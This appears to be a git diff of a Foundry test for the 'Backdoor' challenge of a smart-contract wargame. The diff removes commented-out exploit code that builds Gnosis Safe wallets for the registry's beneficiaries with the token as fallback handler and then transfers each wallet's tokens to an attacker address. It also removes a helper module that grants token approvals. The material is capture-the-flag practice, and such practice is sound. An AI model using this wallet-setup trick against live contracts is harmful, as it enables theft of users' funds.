@@ -108,52 +108,8 @@ contract BackdoorTest is Test {
 
         assertEq(token.balanceOf(attacker), AMOUNT_TOKENS_DISTRIBUTED );
 
-
-        // for( uint i = 0; i < beneficiaries.length; i++ ) {
-        //     // setup wallet beneficiary
-        //     address[] memory walletOwners = new address[](1);
-        //     walletOwners[0] = beneficiaries[i];
-
-        //     // setup the initializer of the wallet by setting the token as the wallet's `fallbackHandler`
-        //     // this will allow us to execute calls to the token contract from the wallet without being the owner
-        //     bytes memory initializer = abi.encodeWithSignature(
-        //         "setup(address[],uint256,address,bytes,address,address,uint256,address)", 
-        //         walletOwners,   // _owners
-        //         1,              // _threshold
-        //         address(0),     // to
-        //         "",             // data
-        //         address(token), // fallbackHandler
-        //         address(0),     // paymentToken
-        //         0,              // payment
-        //         address(0)      // paymentReceiver
-        //     );
-
-        //     // generate the wallet and call the registry callback
-        //     GnosisSafeProxy proxy = walletFactory.createProxyWithCallback(address(masterCopy), initializer, 1, walletRegistry);
-
-        //     assertEq(token.balanceOf(address(proxy)), AMOUNT_TOKENS_DISTRIBUTED_PER_WALLET );
-
-        //     (bool approveSuccess, ) = address(proxy).call(
-        //         abi.encodeWithSignature("transfer(address,uint256)", attacker, AMOUNT_TOKENS_DISTRIBUTED_PER_WALLET)
-        //     );
-        //     assertEq(approveSuccess, true);
-
-        // }
-
-
         vm.stopPrank( );
     }
 
 
 }
-
-
-// contract BackdoorModule {
-//     function approve(
-//         address approvalAddress,
-//         address token,
-//         uint256 amount
-//     ) public {
-//         DamnValuableToken(token).approve(approvalAddress, amount);
-//     }
-// }
